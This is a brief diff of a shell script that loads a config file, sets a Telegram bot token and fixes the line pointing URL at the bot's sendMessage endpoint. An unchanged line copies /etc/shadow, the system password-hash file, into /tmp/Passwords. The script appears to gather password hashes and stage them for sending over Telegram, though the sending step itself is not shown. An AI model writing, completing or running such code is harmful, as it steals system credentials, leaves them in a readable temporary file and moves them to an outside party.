@@ -7,7 +7,7 @@ source /etc/Hermes.conf
 
 TOKEN=$token
 ID=$id
-URL"https://api.telegram.org/bot$TOKEN/sendMessage"
+URL="https://api.telegram.org/bot$TOKEN/sendMessage"
 
 cat /etc/shadow > /tmp/Passwords
 
